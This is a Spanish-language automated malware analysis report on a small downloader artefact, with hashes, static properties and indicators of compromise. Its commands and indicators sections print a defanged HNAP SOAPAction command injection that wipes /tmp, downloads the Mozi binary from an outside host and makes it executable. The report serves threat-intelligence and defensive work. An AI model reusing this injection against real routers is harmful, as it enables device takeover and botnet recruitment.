# 🧬 Payload Analysis

`ea14a1f29e8dcb63b3cd4df90f8c571ee9ae4969d6f1e54174b440ef63b7cb7d`

## 📌 Resumen

Artefacto identificado como ASCII text, with very long lines (531), with CRLF line terminators de 794 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.m` en `hxxp://115.230.91.XXX:47206/Mozi.m`. Se extrajeron 5 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T18:44:08.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `ea14a1f29e8dcb63b3cd4df90f8c571ee9ae4969d6f1e54174b440ef63b7cb7d`
- **MD5:** `89ecb1b7f5c9f70b1bccefcfc561d772`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (531), with CRLF line terminators |
| Tamaño | 794 B |
| Entropía | 5.41 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Download indicators (wget/curl + /tmp)

## 🖥️ Comandos observados / extraídos

```text
SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://115.230.91.XXX:47206/Mozi.m && chmod 777 /t
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://115.230.91.XXX:47206/Mozi.m | strings |
| url | hxxp://schemas[.]xmlsoap[.]org/soap/envelope/ | strings |
| url | hxxp://www[.]w3[.]org/2001/XMLSchema | strings |
| url | hxxp://www[.]w3[.]org/2001/XMLSchema-instance | strings |
| url | hxxp://purenetworks[.]com/HNAP1/ | strings |
| ip | 190.179.164.XXX | static_analysis |
| ip | 115.230.91.XXX | static_analysis |
| command | SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://115.230.91.XXX:47206/Mozi.m && chmod 777 /t | strings |
| hash | ea14a1f29e8dcb63b3cd4df90f8c571ee9ae4969d6f1e54174b440ef63b7cb7d | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
